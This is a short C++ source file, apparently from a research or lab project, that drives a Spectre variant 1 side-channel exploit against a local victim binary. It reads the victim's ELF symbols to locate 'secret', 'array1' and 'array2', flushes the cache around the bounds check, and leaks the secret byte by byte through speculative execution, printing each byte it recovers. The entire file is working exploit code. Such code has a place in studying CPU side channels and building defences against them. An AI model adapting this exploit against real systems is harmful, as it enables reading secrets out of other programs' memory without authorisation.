//
// Created by sage on 1/17/21.
//
#include <stdafx.h>
#include <cacheutils.h>
#include <lilelf.h>
#include <Spectrev1.h>

#include <sys/mman.h>
#include <signal.h>

void handle_sigsegv(int signum, siginfo_t* si, void* vcontext)
{
    reinterpret_cast<ucontext_t*>(vcontext)->uc_mcontext.gregs[REG_RIP]++;
}

int main()
{
    // install sigsegv handler
    struct sigaction action{};
    action.sa_flags = SA_SIGINFO;
    action.sa_sigaction = handle_sigsegv;
//    sigaction(SIGSEGV, &action, NULL);

    auto victim = LilElf("./Spec1Victim");

    // Look for symbols in victim
    auto sym_secret = victim.get_sym("secret");
    auto sym_array1_size = victim.get_sym("array1_size");
    auto sym_array2 =victim.get_sym("array2");
    auto sym_array1 = victim.get_sym("array1");

    auto m_array1_size = victim.get_sym_value(sym_array1_size);
    uint8_t* m_secret = reinterpret_cast<uint8_t*>(victim.get_static_sym_value(sym_secret));

    Spectrev1 s(reinterpret_cast<uint8_t*>(victim.get_sym_value(sym_array1)),
                reinterpret_cast<uint8_t*>(victim.get_sym_value(sym_array2)),
                [&](volatile size_t x){flush(m_array1_size);  ;;},
                [](size_t _t){return _t%16;},
                512,
                MAX_TRIES,
                31
    );
    uint8_t val;
    for (size_t i = 0; i < sym_secret->st_size; ++i)
    {
        s.read_byte(&m_secret[i], &val);
        printf("0x%02X = %c\n", val, val);
//        printf("0x%02x\n", m_secret[i]);
    }

}
